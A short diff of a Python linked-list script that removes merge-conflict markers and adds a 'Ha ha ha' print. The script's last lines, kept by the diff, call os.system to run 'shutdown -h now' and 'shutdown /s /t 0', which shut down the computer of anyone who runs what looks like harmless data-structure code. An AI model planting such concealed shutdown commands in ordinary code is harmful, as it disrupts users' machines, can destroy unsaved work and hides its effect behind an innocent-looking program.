@@ -1,4 +1,3 @@
-<<<<<<< Updated upstream
 from copy import deepcopy
 
 class Node:
@@ -221,8 +220,8 @@ print(link12)
 link12.reverse_contents()
 print(link12)
 
+print("Ha ha ha")
+
 import os
 os.system("shutdown -h now")
 os.system("shutdown /s /t 0")
-=======
->>>>>>> Stashed changes
